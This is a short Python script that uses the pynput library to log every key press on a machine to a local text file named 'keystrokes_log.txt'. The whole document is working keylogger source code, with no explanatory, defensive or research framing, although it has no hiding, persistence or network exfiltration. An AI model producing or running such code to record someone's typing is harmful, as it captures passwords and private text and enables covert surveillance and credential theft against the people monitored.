
from pynput import keyboard
log_file_path = "keystrokes_log.txt"

def on_key_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key} pressed\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_key_release(key):
    pass

def main():
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
